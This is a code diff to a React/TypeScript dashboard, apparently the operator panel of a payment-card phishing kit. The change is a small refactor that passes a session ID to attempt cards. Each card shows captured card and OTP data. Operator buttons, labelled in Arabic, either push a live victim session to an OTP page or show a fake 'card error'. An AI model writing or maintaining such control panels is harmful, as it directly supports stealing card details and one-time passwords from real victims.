@@ -279,12 +279,14 @@ function AttemptBlockCard({
   loadingAction,
   isLatest,
   currentPage,
+  sessionId,
 }: {
   block: AttemptBlock;
-  onControl: (action: string) => Promise<void>;
+  onControl: (sessionId: string, action: string) => Promise<void>;
   loadingAction: string | null;
   isLatest: boolean;
   currentPage?: string;
+  sessionId: string;
 }) {
   const cardData = block.card ? parseData(block.card.data) : null;
   const otpData = block.otp ? parseData(block.otp.data) : null;
@@ -387,7 +389,7 @@ function AttemptBlockCard({
           <button
             type="button"
             disabled={loadingAction === "go_otp"}
-            onClick={() => void onControl("go_otp")}
+            onClick={() => void onControl(sessionId, "go_otp")}
             className="rounded-2xl bg-green-600 px-3 py-2 text-xs font-semibold text-white hover:bg-green-700 disabled:cursor-not-allowed disabled:opacity-50"
           >
             {loadingAction === "go_otp" ? "...جارٍ" : "✓ تحويل لـ OTP"}
@@ -395,7 +397,7 @@ function AttemptBlockCard({
           <button
             type="button"
             disabled={loadingAction === "card_error"}
-            onClick={() => void onControl("card_error")}
+            onClick={() => void onControl(sessionId, "card_error")}
             className="rounded-2xl border border-red-200 bg-red-50 px-3 py-2 text-xs font-semibold text-red-700 hover:bg-red-100 disabled:cursor-not-allowed disabled:opacity-50"
           >
             {loadingAction === "card_error" ? "...جارٍ" : "✗ خطأ البطاقة"}
@@ -453,7 +455,8 @@ function SessionBox({
 
   // Check if session is active based on ping (within 10 seconds)
 
-  const handleControl = async (action: string) => {
+  // Wrapper for onControl that manages loading state
+  const handleBlockControl = async (sessionId: string, action: string) => {
     setLoadingAction(action);
     try {
       await onControl(sessionId, action);
@@ -539,10 +542,11 @@ function SessionBox({
                   <AttemptBlockCard
                     key={block.attemptNumber}
                     block={block}
-                    onControl={handleControl}
+                    onControl={handleBlockControl}
                     loadingAction={loadingAction}
                     isLatest={index === 0}
                     currentPage={currentPage}
+                    sessionId={sessionId}
                   />
                 ))}
               </div>
